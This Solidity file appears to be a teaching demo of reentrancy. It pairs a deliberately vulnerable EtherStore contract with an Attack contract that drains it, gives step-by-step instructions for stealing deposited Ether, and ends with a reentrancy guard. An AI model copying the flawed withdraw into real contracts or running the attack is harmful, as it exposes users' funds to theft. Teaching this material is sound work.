//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

/*
 1. Deploy EtherStore
 2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
 3. Deploy Attack with address of EtherStore
 4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
 You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
 plus 1 Ether sent from this contract).
*/

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value:bal}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {

    EtherStore public etherStore;

    constructor(address _etherStoreAddr) {
        etherStore = EtherStore(_etherStoreAddr);
    }

    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// Ensure all state changes happen before calling external contracts
// Use function modifiers that prevent re-entrancy
contract ReEntranceGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}
